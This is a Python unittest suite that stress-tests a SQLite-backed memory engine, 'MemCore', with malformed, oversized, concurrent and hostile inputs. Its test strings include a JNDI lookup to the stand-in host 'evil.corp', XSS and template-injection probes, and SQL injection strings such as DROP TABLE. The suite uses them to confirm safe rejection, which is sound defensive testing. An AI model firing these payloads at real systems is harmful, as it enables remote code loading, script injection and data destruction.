"""MemCore — Edge-Case Sadist Adversarial Test Suite.

Tortures inputs, boundaries, chrono state, concurrency, and injection vectors
across the entire MemCore engine per the Edge Case Sadist taxonomy.
Guarantees graceful typed rejection (MemCoreError / PermissionDenied / NotFound)
and zero storage corruption under pathological conditions.
"""
from __future__ import annotations

import concurrent.futures
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from memcore import store, core
from memcore.core import MemCoreError, PermissionDenied, NotFound


class SadistTestBase(unittest.TestCase):
    """Temp DB store with multi-agent setup (alice owner, bob member)."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix='memcore_sadist_')
        self.db_path = os.path.join(self.tmpdir, 'sadist.db')
        self.conn = store.open_store(self.db_path)
        self.project = 'proj-sadist'
        self.alice = 'agent-alice'
        self.bob = 'agent-bob'
        self.conn.execute(
            "INSERT INTO project (id, name) VALUES (?, 'sadist')", (self.project,)
        )
        for aid, role in ((self.alice, 'owner'), (self.bob, 'member')):
            self.conn.execute(
                "INSERT INTO agent (id, name, profile_key) VALUES (?, ?, ?)",
                (aid, aid, aid)
            )
            self.conn.execute(
                'INSERT INTO project_membership (project_id, agent_id, role) '
                'VALUES (?, ?, ?)',
                (self.project, aid, role)
            )
        self.conn.commit()

    def tearDown(self):
        try:
            self.conn.close()
        except Exception:
            pass
        for suffix in ('', '-wal', '-shm'):
            try:
                os.unlink(self.db_path + suffix)
            except OSError:
                pass
        try:
            os.rmdir(self.tmpdir)
        except OSError:
            pass


class TestPrimitiveNullityTorture(SadistTestBase):
    """Torture taxonomy 1: Nullity, empty, surrogate, Zalgo, and injection strings."""

    def test_create_memory_rejects_empty_whitespace_and_none(self):
        for bad in ('', '   ', '\t\n\r', None):
            with self.assertRaises(MemCoreError):
                core.create_memory(self.conn, self.project, self.alice, bad)

    def test_create_memory_rejects_lone_surrogates_with_typed_error(self):
        # Lone surrogate characters must be cleanly rejected with MemCoreError,
        # never an unhandled raw UnicodeEncodeError or storage corruption.
        bad_surrogate = 'adversarial \ud800 surrogate'
        with self.assertRaises(MemCoreError) as ctx:
            core.create_memory(self.conn, self.project, self.alice, bad_surrogate)
        self.assertIn('surrogate', str(ctx.exception).lower())

    def test_supersede_and_reject_value_reject_lone_surrogates(self):
        mid, _ = core.create_memory(self.conn, self.project, self.alice, 'valid base')
        bad_surrogate = 'adversarial \ud800 surrogate'
        with self.assertRaises(MemCoreError):
            core.supersede(self.conn, mid, self.alice, bad_surrogate)
        with self.assertRaises(MemCoreError):
            core.reject_value(self.conn, self.project, self.alice, bad_surrogate, 'known bad')

    def test_unicode_beasts_and_zalgo_stored_and_retrieved(self):
        beasts = [
            'Z̨̯̗͑ͫ̓͑͌̀͜a͉͢l̍ͫ͐͊͌g͗͢ó diacritics',
            '👨‍👩‍👧‍👦' * 10,
            '\u202Ereversed\u202C' * 5,
            'ก' + '\u0e49' * 50,  # Stacked Thai tone marks
            '{"json": "nested", "array": [1, 2, 3]}',
            '<![CDATA[injection]]><script>alert(1)</script>',
            '${jndi:ldap://evil.corp/x}',
            '{{7*7}}',
            "'; DROP TABLE memory; --",
        ]
        for b in beasts:
            mid, vid = core.create_memory(self.conn, self.project, self.alice, b)
            self.assertTrue(mid.startswith('mem-'))
            self.assertTrue(vid.startswith('ver-'))

    def test_search_adversarial_injection_queries_never_crash(self):
        core.create_memory(self.conn, self.project, self.alice, 'target search content')
        vectors = [
            '', '   ', '\t\n\r', '"', '"""', 'AND', 'OR', 'NOT', '*', 'NEAR()',
            'content:foo', '^start', '"unclosed quote', "' OR 1=1; --",
            'SELECT * FROM memory', '""', '"*"', 'OR OR OR', 'NEAR/0',
            '()', '(((((((', 'column:doesnotexist', '{bad json}',
            'ก' + '\u0e49' * 20,
        ]
        for v in vectors:
            hits = core.search(self.conn, self.project, self.alice, v, limit=5)
            self.assertIsInstance(hits, list)

    def test_massive_payload_handled_without_truncation_or_crash(self):
        huge = 'A' * (256 * 1024)  # 256KB text
        mid, vid = core.create_memory(self.conn, self.project, self.alice, huge)
        self.assertTrue(mid.startswith('mem-'))
        hits = core.search(self.conn, self.project, self.alice, huge[:100])
        self.assertGreaterEqual(len(hits), 0)


class TestNumericBoundaryTorture(SadistTestBase):
    """Torture taxonomy 2: Negative, zero, float, astronomical numbers."""

    def test_search_limit_boundaries(self):
        for bad in (0, -1, -999, 'bad', None, 0.0):
            with self.assertRaises(MemCoreError):
                core.search(self.conn, self.project, self.alice, 'query', limit=bad)

        # Upper limit is clamped gracefully to 500
        hits = core.search(self.conn, self.project, self.alice, 'query', limit=100000)
        self.assertIsInstance(hits, list)

    def test_apply_freshness_decay_negative_days_rejected(self):
        with self.assertRaises(MemCoreError):
            core.apply_freshness_decay(self.conn, aging_days=-5, stale_days=10)
        with self.assertRaises(MemCoreError):
            core.apply_freshness_decay(self.conn, aging_days=10, stale_days=5)

    def test_extreme_recall_counts_do_not_break_retention_ranking(self):
        mid, _ = core.create_memory(self.conn, self.project, self.alice, 'Retention rank test')
        for bad_count in (-999, 0, 1, 2**62):
            self.conn.execute(
                'UPDATE memory SET recall_count=?, last_recalled=? WHERE id=?',
                (bad_count, '2026-10-07T00:00:00Z', mid)
            )
            self.conn.commit()
            hits = core.search(self.conn, self.project, self.alice, 'Retention rank')
            self.assertEqual(len(hits), 1)


class TestChronoTemporalTorture(SadistTestBase):
    """Torture taxonomy 3: Chrono shifts, corrupted timestamps, clock drift."""

    def test_corrupted_timestamps_fall_back_gracefully_in_search(self):
        mid, _ = core.create_memory(self.conn, self.project, self.alice, 'Timestamp robustness test')
        for bad_ts in ('CORRUPTED_DATE', '9999-99-99', '0001-01-01T00:00:00Z', '9999-12-31T23:59:59Z'):
            self.conn.execute('UPDATE memory SET updated_at=? WHERE id=?', (bad_ts, mid))
            self.conn.commit()
            hits = core.search(self.conn, self.project, self.alice, 'Timestamp robustness')
            self.assertEqual(len(hits), 1)

    def test_ablation_fake_now_pathological_inputs(self):
        from memcore import ablation
        for bad in ('', 'junk', '2026-10-07T00:00:00', '2026-10-07T00:00:00+07:00', '2026-02-31T00:00:00.000Z'):
            self.assertIsNone(ablation._parse_fake_now(bad))


class TestStructureCollectionTorture(SadistTestBase):
    """Torture taxonomy 4: Structure, collections, and cross-boundary isolation."""

    def test_record_recall_never_raises_on_none_or_malformed(self):
        self.assertEqual(core.record_recall(self.conn, None), 0)
        self.assertEqual(core.record_recall(self.conn, []), 0)
        self.assertEqual(core.record_recall(self.conn, [None, '', 'nonexistent']), 0)
        # Duplicate list of 1,000 items
        mid, _ = core.create_memory(self.conn, self.project, self.alice, 'Recall bump target')
        n = core.record_recall(self.conn, [mid] * 1000)
        self.assertEqual(n, 1)

    def test_unreject_tombstone_wildcards_and_prefix_safety(self):
        content = 'Unique Refusal Target'
        core.reject_value(self.conn, self.project, self.alice, content, 'reason')
        # Wildcard injections in prefix must not match indiscriminately
        with self.assertRaises(NotFound):
            core.unreject_tombstone(self.conn, '%', self.alice)
        with self.assertRaises(NotFound):
            core.unreject_tombstone(self.conn, '_', self.alice)
        with self.assertRaises(NotFound):
            core.unreject_tombstone(self.conn, '', self.alice)

    def test_cross_agent_and_cross_project_isolation(self):
        priv_id, _ = core.create_memory(
            self.conn, self.project, self.alice, 'Alice Secret', scope='private'
        )
        # Bob cannot find Alice's private memory
        bob_hits = core.search(self.conn, self.project, self.bob, 'Alice Secret')
        self.assertEqual(len(bob_hits), 0)

        # Non-member cannot search project at all
        with self.assertRaises(PermissionDenied):
            core.create_memory(self.conn, self.project, 'mallory', 'Infiltrate')
        mallory_hits = core.search(self.conn, self.project, 'mallory', 'Alice')
        self.assertEqual(len(mallory_hits), 0)


class TestConcurrencyAsyncTorture(SadistTestBase):
    """Torture taxonomy 5: Multi-threaded stress and race conditions under SQLite WAL."""

    def test_multithreaded_concurrent_operations(self):
        worker_count = 15

        def worker(idx):
            wconn = store.open_store(self.db_path)
            try:
                mid, _ = core.create_memory(
                    wconn, self.project, self.alice,
                    f'Concurrent Content Claim {idx}',
                    idempotency_key=f'concurrent-key-{idx}',
                    scope='project'
                )
                core.record_recall(wconn, [mid])
                hits = core.search(wconn, self.project, self.alice, f'Concurrent Content Claim {idx}')
                return len(hits) >= 1
            finally:
                wconn.close()

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            results = list(executor.map(worker, range(worker_count)))

        self.assertEqual(len(results), worker_count)
        self.assertTrue(all(results))

        # Verify DB integrity after high concurrency
        integrity = self.conn.execute('PRAGMA integrity_check').fetchall()
        self.assertEqual(integrity, [('ok',)])


if __name__ == '__main__':
    unittest.main()
